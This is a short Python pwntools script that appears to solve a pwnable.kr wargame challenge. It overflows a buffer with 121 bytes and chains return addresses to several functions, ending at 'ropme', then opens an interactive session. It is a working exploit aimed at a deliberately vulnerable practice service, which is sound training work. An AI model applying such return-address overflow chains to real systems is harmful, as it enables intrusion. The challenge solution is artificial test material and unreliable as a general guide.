from pwn import *

r = remote("pwnable.kr",10016)
payload=b'a' * 121
a = p32(0x0804129d)
b = p32(0x080412cf)
c = p32(0x08041301)
d = p32(0x08041333)
e = p32(0x08041365)
f = p32(0x08041397)
g = p32(0x080413c9)
ropme = p32(0x0804150b)
payload += a + b + c + d + e + f + g + ropme


print(r.recvuntil(b"Select Menu:"))
r.sendline(payload)
print(f'sent: {payload}')
print(r.recv(1024))
r.interactive()
